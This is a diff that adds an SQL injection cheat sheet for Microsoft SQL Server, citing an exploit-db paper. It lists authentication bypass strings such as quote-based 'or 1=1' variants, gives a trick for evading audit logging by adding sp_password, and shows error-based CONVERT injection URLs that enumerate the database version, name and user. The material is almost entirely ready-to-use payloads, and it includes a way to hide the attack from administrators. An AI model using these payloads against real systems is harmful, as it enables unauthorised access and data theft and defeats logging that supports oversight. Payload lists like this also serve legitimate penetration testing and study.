@@ -1,0 +1,46 @@
+==============================================================================
+References:
+https://www.exploit-db.com/papers/12975/
+==============================================================================
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++MSSQL+++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+------------------------------------------------------------------------------
+Authentication Bypass examples:
+------------------------------------------------------------------------------
+' or 1=1 --
+a' or 1=1 --
+" or 1=1 --
+a" or 1=1 --
+' or 1=1 #
+" or 1=1 #
+or 1=1 --
+' or 'x'='x
+" or "x"="x
+') or ('x'='x
+") or ("x"="x
+' or username LIKE '%admin%
+
+USERNAME:  ' or 1/*
+PASSWORD:  */ =1 --    |
+
+USERNAME: admin' or 'a'='a |
+PASSWORD: '#		     
+------------------------------------------------------------------------------
+Audit Log Evasion:
+------------------------------------------------------------------------------
+All of our SQL queries are logged and can be observed by admin.
+But we can use "sp_password" to evade logging.
+
+formusr = ' or 1=1 -- sp_password
+formpwd = anything
+
+SQL server don't log queries which includes sp_password for security reasons.
+
+
+------------------------------------------------------------------------------
+Error Message Attack with "CONVERT"
+------------------------------------------------------------------------------
+http://www.example.com/page.asp?id=1+and+1=convert(int,@@version)--   //enumerate db version
+http://www.example.com/page.asp?id=1+and+1=convert(int,db_name())--   //enumerate db name
+http://www.example.com/page.asp?id=1+and+1=convert(int,user_name())-- //enumerate username
